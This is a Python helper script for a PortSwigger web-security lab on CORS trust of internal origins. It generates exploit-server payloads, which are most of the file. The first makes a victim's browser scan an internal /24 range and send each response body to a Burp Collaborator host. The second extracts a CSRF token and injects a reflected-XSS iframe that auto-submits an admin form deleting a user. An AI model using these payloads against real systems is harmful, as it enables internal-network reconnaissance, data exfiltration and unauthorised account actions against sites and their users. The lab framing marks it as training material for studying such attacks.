# Lab 04 — CORS vulnerability with internal network pivot attack
# PortSwigger: https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack
#
# Vulnerability: The server trusts any Origin from the internal network
#                range (192.168.0.0/24)
# Aim:           Use the victim's browser as a pivot into the internal
#                network, find an internal admin panel, and delete carlos
#
# Technique (entirely victim-browser-driven, three stages):
#   Stage 1 — network scan: the victim's browser fetches every IP in
#             192.168.0.0/24 on port 8080. Each result is exfiltrated to
#             Burp Collaborator, revealing which IP has a live application.
#   Stage 2 — the discovered internal app is an admin login page with
#             reflected XSS in its username parameter.
#   Stage 3 — inject an XSS payload that loads /admin in an iframe (now
#             "from the inside", fully trusted by the internal app) and
#             auto-submits a request that deletes carlos.
#
#   This entire chain runs in the VICTIM's browser. This script cannot
#   execute any of it directly — it builds and prints each stage's exploit
#   for delivery via the exploit server, exactly as Burp Suite labs intend.
#
# Requires: Burp Collaborator — update COLLABORATOR_DOMAIN before running.
#
# Usage: python cors_lab04.py <url>

import sys
import urllib3
from cors_utils import banner, section, print_box, print_step

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─── UPDATE THIS ────────────────────────────────────────────────────────────
COLLABORATOR_DOMAIN = "YOUR-COLLABORATOR-ID.oastify.com"
# ────────────────────────────────────────────────────────────────────────────


def build_scan_exploit(collab_domain):
    """Stage 1 — scan 192.168.0.0/24:8080 from the victim's browser."""
    return f"""\
<script>
collaboratorURL = 'https://{collab_domain}';
for (let i = 0; i < 256; i++) {{
    fetch('http://192.168.0.' + i + ':8080')
        .then(r => r.text())
        .then(text => {{
            fetch(collaboratorURL + '?ip=192.168.0.' + i + '&code=' + encodeURIComponent(text));
        }})
        .catch(() => {{}});
}}
</script>"""


def build_delete_exploit(internal_ip):
    """
    Stage 3 — given the discovered internal IP, inject XSS via the login
    page's username parameter to auto-submit a delete request for carlos
    once loaded inside an /admin iframe (now trusted as "internal").
    """
    return f"""\
<script>
var url = "http://{internal_ip}:8080";
fetch(url).then(r => r.text()).then(text => {{
    var csrfMatch = text.match(/csrf" value="([^"]+)"/);
    var csrf = csrfMatch ? csrfMatch[1] : '';
    var xssPayload =
      '"><iframe src=/admin onload="' +
        'var f=this.contentWindow.document.forms[0];' +
        'if(f.username) f.username.value=\\'carlos\\', f.submit()' +
      '">';
    location = url + '/login?username=' + encodeURIComponent(xssPayload) +
               '&password=test&csrf=' + csrf;
}});
</script>"""


if __name__ == "__main__":
    banner()
    section("LAB 04 — CORS: INTERNAL NETWORK PIVOT ATTACK")

    if len(sys.argv) != 2:
        print("  Usage: python cors_lab04.py <url>")
        sys.exit(1)

    if COLLABORATOR_DOMAIN == "YOUR-COLLABORATOR-ID.oastify.com":
        print("  ✘  Update COLLABORATOR_DOMAIN in the script before running.")
        sys.exit(1)

    url = sys.argv[1]

    print("  ℹ  This entire attack runs from the VICTIM's browser — there is")
    print("     no direct HTTP request this script can make itself. Each stage")
    print("     below is built and printed for delivery via the exploit server.\n")

    # ── Stage 1 ────────────────────────────────────────────────────────────────
    section("Stage 1 — scan the internal network (192.168.0.0/24:8080)")
    stage1 = build_scan_exploit(COLLABORATOR_DOMAIN)
    print_box("EXPLOIT SERVER BODY — Stage 1", stage1)

    print_step("Paste Stage 1 into the exploit server Body field, Store, Deliver to victim")
    print_step("Open Burp Collaborator → Poll now")
    print_step("Find the responding IP (e.g. '?ip=192.168.0.X&code=...') — note the IP")
    print_step("Inspect the disclosed 'code' parameter — this is the internal app's HTML")
    print()
    print("  ℹ  Only ONE IP in the range should respond — that's your internal")
    print("     admin application. Confirm its login form has a username field")
    print("     vulnerable to reflected XSS before continuing to Stage 2.")

    # ── Stage 2/3 ────────────────────────────────────────────────────────────────
    section("Stage 2/3 — exploit the discovered IP to delete carlos")

    discovered_ip = input("  Enter the internal IP discovered in Stage 1 (e.g. 192.168.0.50): ").strip()
    if not discovered_ip:
        discovered_ip = "192.168.0.X"
        print(f"  ℹ  No IP entered — using placeholder '{discovered_ip}', replace before delivering.\n")

    stage2 = build_delete_exploit(discovered_ip)
    print_box(f"EXPLOIT SERVER BODY — Stage 2/3 (target: {discovered_ip})", stage2)

    print_step("Paste this into the exploit server Body field, Store, Deliver to victim")
    print_step("The victim's browser fetches the login page, extracts its CSRF token,")
    print_step("then navigates to a URL where 'username' contains an XSS payload")
    print_step("That payload opens /admin in an iframe (now trusted as internal) and")
    print_step("auto-submits a form setting username=carlos, deleting the user")
    print()
    print("  ℹ  Every request in this entire chain originates from the VICTIM's")
    print("     browser. The attacker never touches 192.168.0.0/24 directly —")
    print("     the internal network's trust in itself becomes the weapon,")
    print("     entirely by proxy through someone who happens to be inside it.")
